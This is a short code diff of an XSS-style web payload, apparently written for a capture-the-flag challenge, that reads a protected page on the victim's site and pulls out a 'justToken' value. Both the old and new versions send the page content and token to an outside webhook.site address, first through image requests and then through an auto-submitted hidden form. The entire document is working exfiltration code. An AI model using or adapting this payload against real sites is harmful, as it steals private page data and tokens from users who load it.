@@ -1,14 +1,17 @@
+<form action="https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98" method="GET">
+  <input type="hidden" name="raw" id="raw">
+  <input type="hidden" name="token" id="token">
+</form>
+
 <script>
-  fetch('/tasks/preview/0/0')
-    .then(r => r.text())
-    .then(data => {
-      const i = new Image()
-      i.src = 'https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?raw=' + encodeURIComponent(data);
-      
-      const token = data.match(/justToken\{([^}]+)\}/)?.[1];
-      if (token) {
-        const i2 = new Image();
-        i2.src = 'https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?token=' + token;
-      }
-    });
+fetch('/tasks/preview/0/0')
+  .then(r => r.text())
+  .then(data => {
+    document.getElementById('raw').value = data;
+    const token = data.match(/justToken\{([^}]+)\}/)?.[1];
+    if (token) {
+      document.getElementById('token').value = token;
+    }
+    document.forms[0].submit();
+  });
 </script>
